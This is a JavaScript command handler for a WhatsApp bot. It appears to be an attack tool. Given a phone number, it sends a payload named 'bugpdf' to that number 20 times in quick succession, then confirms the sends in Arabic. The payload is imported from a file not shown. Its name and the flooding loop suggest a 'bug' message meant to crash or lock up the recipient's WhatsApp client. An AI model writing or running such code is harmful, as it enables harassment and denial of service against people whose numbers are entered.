const { bugpdf } = require('../bugpdf');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("bug")) return;

  const parts = text.trim().split(' ');
  const command = parts[0];
  const second = parts[1];
  const third = parts[2];

  let number;
  let showConfirm = false;

  if (second === 'confirm' && third && !isNaN(third)) {
    number = third;
    showConfirm = true;
  } else if (second && !isNaN(second)) {
    number = second;
  } else {
    return reply("❌ يرجى كتابة الرقم بشكل صحيح.\nمثال:\n- bug 966xxxxxxxxx\n- bug confirm 966xxxxxxxxx");
  }

  const jid = `${number}@s.whatsapp.net`;

  try {
    for (let i = 0; i < 20; i++) {
      await sock.sendMessage(jid, {
        text: bugpdf
      });
      await new Promise(resolve => setTimeout(resolve, 300)); // فاصل زمني بين الرسائل
    }

    if (showConfirm) {
      await reply(`✅ تم إرسال BugPDF إلى: ${number} عدد 20 مرة`);
    }

  } catch (err) {
    console.error(err);
    await reply(`❌ فشل في إرسال الرسالة إلى: ${number}`);
  }
};
